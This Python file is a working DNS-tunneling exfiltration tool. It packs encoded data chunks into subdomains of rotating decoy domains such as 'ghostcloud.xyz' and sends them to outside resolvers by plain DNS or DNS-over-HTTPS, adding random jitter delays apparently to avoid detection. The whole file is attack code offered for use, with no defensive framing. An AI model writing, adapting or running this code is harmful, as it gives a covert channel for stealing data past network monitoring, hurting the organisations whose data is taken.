import os
import random
import time
from dnslib import DNSRecord, QTYPE
import requests

ROTATE_DOMAINS = ["cdnmirror.net", "ghostcloud.xyz", "akamirror.io"]

def jitter_sleep():
    time.sleep(random.uniform(0.4, 1.2))

def craft_domain(encoded):
    domain = random.choice(ROTATE_DOMAINS)
    subdomain = encoded[:63]
    return f"{subdomain}.{domain}"

def send_dns(domain, dns_server="8.8.8.8"):
    try:
        query = DNSRecord.question(domain, qtype=QTYPE.A)
        query.send(dns_server, port=53)
        print(f"[✓] DNS sent: {domain}")
    except Exception as e:
        print(f"[!] DNS Error: {e}")

def send_doh(domain):
    url = "https://dns.google/resolve"
    params = {"name": domain, "type": "A"}
    headers = {"accept": "application/dns-json"}
    try:
        requests.get(url, params=params, headers=headers)
        print(f"[✓] DoH sent: {domain}")
    except Exception as e:
        print(f"[!] DoH Error: {e}")

def send_encoded_chunk(chunk, method="dns"):
    domain = craft_domain(chunk)
    print(f"[+] Prepared domain: {domain}")

    try:
        log_path = os.path.join("logs", "sent_chunks.txt")
        print(f"[+] Logging chunk to: {log_path}")
        with open(log_path, "a") as log_file:
            log_file.write(f"{domain.split('.')[0]}\n")
        print(f"[✓] Chunk logged: {domain.split('.')[0]}")
    except Exception as e:
        print(f"[!] Failed to write to log: {e}")

    if method == "dns":
        send_dns(domain)
    elif method == "doh":
        send_doh(domain)

    jitter_sleep()

